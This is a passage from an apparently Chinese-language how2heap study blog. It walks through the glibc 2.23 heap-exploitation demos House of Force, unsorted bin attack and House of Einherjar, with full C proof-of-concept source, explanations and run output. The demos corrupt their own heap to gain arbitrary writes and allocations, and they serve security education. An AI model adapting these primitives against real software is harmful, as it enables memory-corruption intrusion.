*)ptr_top + <span class="keyword">sizeof</span>(<span class="type">long</span>)) = <span class="number">-1</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"New size of top chunk %#llx\n"</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line">	<span class="comment">//------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n"</span></span><br><span class="line">	   <span class="string">"Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"</span></span><br><span class="line">	   <span class="string">"overflow) and will then be able to allocate a chunk right over the desired region.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span></span><br><span class="line"><span class="comment">	 * new_top = old_top + nb</span></span><br><span class="line"><span class="comment">	 * nb = new_top - old_top</span></span><br><span class="line"><span class="comment">	 * req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment">	 * req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment">	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment">	 * req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> evil_size = (<span class="type">unsigned</span> <span class="type">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="type">long</span>)*<span class="number">4</span> - (<span class="type">unsigned</span> <span class="type">long</span>)ptr_top;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"</span></span><br><span class="line">	   <span class="string">"we will malloc %#lx bytes.\n"</span>, bss_var, ptr_top, evil_size);</span><br><span class="line">	<span class="type">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"As expected, the new pointer is at the same place as the old top chunk: %p\n"</span>, new_ptr - <span class="keyword">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow, the next chunk we overwrite will point at our target buffer.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(100) =&gt; %p!\n"</span>, ctr_chunk);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can finally overwrite that value:\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... old string: %s\n"</span>, bss_var);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... doing strcpy overwrite with \"YEAH!!!\"...\n"</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(ctr_chunk, <span class="string">"YEAH!!!"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... new string: %s\n"</span>, bss_var);</span><br><span class="line"></span><br><span class="line">	assert(ctr_chunk == bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// some further discussion:</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size "</span></span><br><span class="line">	<span class="comment">//	"and we \nwant to set this result to the address of malloc_got_address-8\n\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),"</span></span><br><span class="line">	<span class="comment">//	"\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n");</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//fprintf(stderr, "The large chunk with evil_size has been allocated here 0x%08x\n",p2);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n",malloc_got_address);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//fprintf(stderr, "This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n");</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>house of force这个攻击手法是借助于top_chunk来实现的，程序可以溢出到top_chunk+申请任意大小的堆块，就可以使用这个方法来进行漏洞利用。</p>
<p>这个程序首先创建了一个堆块，并将top chunk的size改成-1。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/17.png"></p>
<p>接着将top chunk向前一直推到bss_var - 0x10。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/18.png"></p>
<p>接着分配堆块的时候就会分配到bss_var这里，就可以对bss_var进行修改。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/19.png"></p>
<p>可以看以bss_var已经被更改了。运行结果如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the House of Force</span><br><span class="line"></span><br><span class="line">The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.</span><br><span class="line">The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.</span><br><span class="line"></span><br><span class="line">In the end, we will use this to overwrite a variable at 0x555555558060.</span><br><span class="line">Its current value is: This is a string that we want to overwrite.</span><br><span class="line"></span><br><span class="line">Let's allocate the first chunk, taking space from the wilderness.</span><br><span class="line">The chunk of 256 bytes has been allocated at 0x55555555b000.</span><br><span class="line"></span><br><span class="line">Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.</span><br><span class="line">Real size (aligned and all that jazz) of our allocated chunk is 280.</span><br><span class="line"></span><br><span class="line">Now let's emulate a vulnerability that can overwrite the header of the Top Chunk</span><br><span class="line"></span><br><span class="line">The top chunk starts at 0x55555555b110</span><br><span class="line"></span><br><span class="line">Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.</span><br><span class="line">Old size of top chunk 0x20ef1</span><br><span class="line">New size of top chunk 0xffffffffffffffff</span><br><span class="line"></span><br><span class="line">The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.</span><br><span class="line">Next, we will allocate a chunk that will get us right up against the desired region (with an integer</span><br><span class="line">overflow) and will then be able to allocate a chunk right over the desired region.</span><br><span class="line"></span><br><span class="line">The value we want to write to at 0x555555558060, and the top chunk is at 0x55555555b110, so accounting for the header size,</span><br><span class="line">we will malloc 0xffffffffffffcf30 bytes.</span><br><span class="line">As expected, the new pointer is at the same place as the old top chunk: 0x55555555b110</span><br><span class="line"></span><br><span class="line">Now, the next chunk we overwrite will point at our target buffer.</span><br><span class="line">malloc(100) =&gt; 0x555555558060!</span><br><span class="line">Now, we can finally overwrite that value:</span><br><span class="line">... old string: This is a string that we want to overwrite.</span><br><span class="line">... doing strcpy overwrite with "YEAH!!!"...</span><br><span class="line">... new string: YEAH!!!</span><br></pre></td></tr></tbody></table></figure>

<h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "</span></span><br><span class="line">		   <span class="string">"global variable global_max_fast in libc for further fastbin attack\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's first look at the target we want to rewrite on stack:\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %ld\n\n"</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we allocate first normal chunk on the heap at: %p\n"</span>,p);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And allocate another normal chunk in order to avoid consolidating the top chunk with"</span></span><br><span class="line">           <span class="string">"the first one during the free()\n\n"</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "</span></span><br><span class="line">		   <span class="string">"point to %p\n"</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">	p[<span class="number">1</span>]=(<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n"</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's malloc again to get the chunk we just free. During this time, the target should have already been "</span></span><br><span class="line">		   <span class="string">"rewritten:\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %p\n"</span>, &amp;stack_var, (<span class="type">void</span>*)stack_var);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>首先这里创建了一个栈上的数据，并且申请了400大小的堆块和500大小的堆块，500大小的堆块是为了防止400与top_chunk合并。释放400大小的堆块，因为不在fastbin范围内所以会直接进入unsortedbin。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/20.png"></p>
<p>改unsortedbin的bk为stack_addr - 2，下面红色的是stack_addr里面的值。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/21.png"></p>
<p>再次创建400大小的堆块，所申请的 chunk 处于 small bin 所在的范围，其对应的 bin 中暂时没有 chunk，所以会去 unsorted bin 中找，发现 unsorted bin 不空，于是把 unsorted bin 中的最后一个 chunk 拿出来。此时的stack_addr时里面的值就是unsortedbin的值了。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/22.png"></p>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates unsorted bin attack by write a large unsigned long value into stack</span><br><span class="line">In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack</span><br><span class="line"></span><br><span class="line">Let's first look at the target we want to rewrite on stack:</span><br><span class="line">0x7fffffffdd30: 0</span><br><span class="line"></span><br><span class="line">Now, we allocate first normal chunk on the heap at: 0x55555555b010</span><br><span class="line">And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()</span><br><span class="line"></span><br><span class="line">We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7ffff7dd1b78</span><br><span class="line">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><br><span class="line">And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7fffffffdd20</span><br><span class="line"></span><br><span class="line">Let's malloc again to get the chunk we just free. During this time, the target should have already been rewritten:</span><br><span class="line">0x7fffffffdd30: 0x7ffff7dd1b78</span><br></pre></td></tr></tbody></table></figure>

<h3 id="house-of-einherjar-off-by-null"><a href="#house-of-einherjar-off-by-null" class="headerlink" title="house_of_einherjar(off-by-null)"></a>house_of_einherjar(off-by-null)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Credit to st4g3r for publishing this technique</span></span><br><span class="line"><span class="comment">   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</span></span><br><span class="line"><span class="comment">   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome to House of Einherjar!\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 16.04 64bit.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* a;</span><br><span class="line">	<span class="type">uint8_t</span>* b;</span><br><span class="line">	<span class="type">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nWe allocate 0x38 bytes for 'a'\n"</span>);</span><br><span class="line">	a = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"a: %p\n"</span>, a);</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n"</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// create a fake chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"However, you can also create the chunk in the heap or the bss, as long as you know its address\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"(although we could do the unsafe unlink technique here in some scenarios)\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> fake_chunk[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">	fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size is now used and must equal fake_chunk's size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span></span><br><span class="line">	fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// size of the chunk just needs to be small enough to stay in the small bin</span></span><br><span class="line">	fake_chunk[<span class="number">2</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">// fwd</span></span><br><span class="line">	fake_chunk[<span class="number">3</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">// bck</span></span><br><span class="line">	fake_chunk[<span class="number">4</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">//fwd_nextsize</span></span><br><span class="line">	fake_chunk[<span class="number">5</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">//bck_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Our fake chunk at %p looks like:\n"</span>, fake_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"prev_size (not used): %#lx\n"</span>, fake_chunk[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"size: %#lx\n"</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"fwd: %#lx\n"</span>, fake_chunk[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"bck: %#lx\n"</span>, fake_chunk[<span class="number">3</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"fwd_nextsize: %#lx\n"</span>, fake_chunk[<span class="number">4</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"bck_nextsize: %#lx\n"</span>, fake_chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment">	 * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">	<span class="type">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nWe allocate 0xf8 bytes for 'b'.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b: %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line">	<span class="comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nb.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b.size is: (0x100) | prev_inuse = 0x101\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We overflow 'a' with a single null byte into the metadata of 'b'\n"</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This is easiest if b.size is a multiple of 0x100 so you "</span></span><br><span class="line">		   <span class="string">"don't change the size of b, only its prev_inuse bit\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If it had been modified, we would need a fake chunk inside "</span></span><br><span class="line">		   <span class="string">"b where it will try to consolidate the next chunk\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Write a fake prev_size to the end of a</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nWe write a fake prev_size to the last %lu bytes of a so that "</span></span><br><span class="line">		   <span class="string">"it will consolidate with our fake chunk\n"</span>, <span class="keyword">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line">	<span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((b-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>) - (<span class="type">uint8_t</span>*)fake_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Our fake prev_size will be %p - %p = %#lx\n"</span>, b-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">	*(<span class="type">size_t</span>*)&amp;a[real_a_size-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Change the fake chunk's size to reflect b's new prev_size</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nModify fake chunk's size to reflect b's new prev_size\n"</span>);</span><br><span class="line">	fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// free b and it will consolidate with our fake chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Our fake chunk size is now %#lx (b.size + fake_prev_size)\n"</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//if we allocate another chunk before we free b we will need to </span></span><br><span class="line">	<span class="comment">//do two things: </span></span><br><span class="line">	<span class="comment">//1) We will need to adjust the size of our fake chunk so that</span></span><br><span class="line">	<span class="comment">//fake_chunk + fake_chunk's size points to an area we control</span></span><br><span class="line">	<span class="comment">//2) we will need to write the size of our fake chunk</span></span><br><span class="line">	<span class="comment">//at the location we control. </span></span><br><span class="line">	<span class="comment">//After doing these two things, when unlink gets called, our fake chunk will</span></span><br><span class="line">	<span class="comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span></span><br><span class="line">	<span class="comment">//otherwise we need to make sure that our fake chunk is up against the</span></span><br><span class="line">	<span class="comment">//wilderness</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nNow we can call malloc() and it will begin in our fake chunk\n"</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Next malloc(0x200) is at %p\n"</span>, d);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>其实就是利用了off by one进行一字节的溢出，修改下一个堆块的<code>prev_size</code>和 <code>PREV_INUSE</code> 比特位，滥用 <code>free</code> 中的后向合并操作，从而实现chunk任意地址分配。这个和house of force有点相似</p>
<p>首先创建了一个0x38大小的堆块，接着在栈上伪造prev_size, size, fd, bk, fd_nextsize, bk_nextsize。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/23.png"></p>
<p>然后创建了一个0xf8大小的堆块，并使用off-by-one将0xf8大小的堆块的<strong>PREV_INUSE</strong>位改为0</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/24.png"></p>
<p>对b的perv_size进行伪造。<code>fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk)</code></p>
<p>也就是b040这里的地址 - 栈上伪造的地址。并将栈上伪造的size也给换掉。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/25.png"></p>
